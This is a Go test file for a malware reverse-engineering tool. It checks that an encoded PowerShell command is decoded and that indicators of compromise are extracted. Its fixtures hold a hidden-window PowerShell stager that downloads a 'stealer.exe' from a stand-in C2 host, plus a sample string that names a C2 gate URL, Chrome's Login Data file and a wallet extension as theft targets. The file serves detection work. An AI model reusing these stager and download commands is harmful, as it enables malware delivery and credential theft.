package re_test

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"testing"
	"unicode/utf16"

	"github.com/RaihanStark/scamctl/pkg/re"
)

func TestDeobfuscatePowerShellEncodedCommand(t *testing.T) {
	tmpDir := t.TempDir()
	scriptPath := filepath.Join(tmpDir, "stager.bat")

	// Encode "Invoke-WebRequest -Uri http://malicious-c2.com/stealer.exe -OutFile C:\\tmp\\payload.exe"
	rawCmd := "Invoke-WebRequest -Uri http://malicious-c2.com/stealer.exe -OutFile C:\\tmp\\payload.exe"
	var u16Bytes []byte
	for _, r := range rawCmd {
		u16 := utf16.Encode([]rune{r})[0]
		u16Bytes = append(u16Bytes, byte(u16), byte(u16>>8))
	}
	b64Encoded := base64.StdEncoding.EncodeToString(u16Bytes)

	scriptContent := "@echo off\npowershell.exe -w hidden -enc " + b64Encoded + "\n"
	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0644); err != nil {
		t.Fatalf("failed to write test script: %v", err)
	}

	res := &re.REResult{
		FilePath: scriptPath,
		FileName: filepath.Base(scriptPath),
	}

	if err := re.DeobfuscateScripts(scriptPath, res); err != nil {
		t.Fatalf("DeobfuscateScripts returned error: %v", err)
	}

	if len(res.DecodedPayloads) == 0 {
		t.Fatalf("expected at least 1 decoded payload, got 0")
	}

	if res.DecodedPayloads[0].Content != rawCmd {
		t.Errorf("expected decoded content %q, got %q", rawCmd, res.DecodedPayloads[0].Content)
	}
}

func TestExtractIoCs(t *testing.T) {
	tmpDir := t.TempDir()
	filePath := filepath.Join(tmpDir, "payload.bin")

	content := "Connect to http://185.220.101.5/gate.php and steal \\Google\\Chrome\\User Data\\Default\\Login Data and nkbihfbeogaeaoehlefnkodbefgpgknn"
	if err := os.WriteFile(filePath, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write file: %v", err)
	}

	res := &re.REResult{
		FilePath: filePath,
		FileName: filepath.Base(filePath),
	}

	if err := re.ExtractStringsAndIoCs(filePath, res); err != nil {
		t.Fatalf("ExtractStringsAndIoCs returned error: %v", err)
	}

	foundC2 := false
	foundChrome := false
	foundWallet := false

	for _, ioc := range res.IoCs {
		if ioc.Type == "C2 / Remote URL" && ioc.Value == "http://185.220.101.5/gate.php" {
			foundC2 = true
		}
		if ioc.Type == "Targeted Credential Database" && ioc.Value == "Login Data" {
			foundChrome = true
		}
		if ioc.Type == "Cryptocurrency Wallet Target" {
			foundWallet = true
		}
	}

	if !foundC2 {
		t.Errorf("expected C2 URL IoC, got %+v", res.IoCs)
	}
	if !foundChrome {
		t.Errorf("expected Chrome Login Data IoC, got %+v", res.IoCs)
	}
	if !foundWallet {
		t.Errorf("expected Crypto Wallet IoC, got %+v", res.IoCs)
	}
}
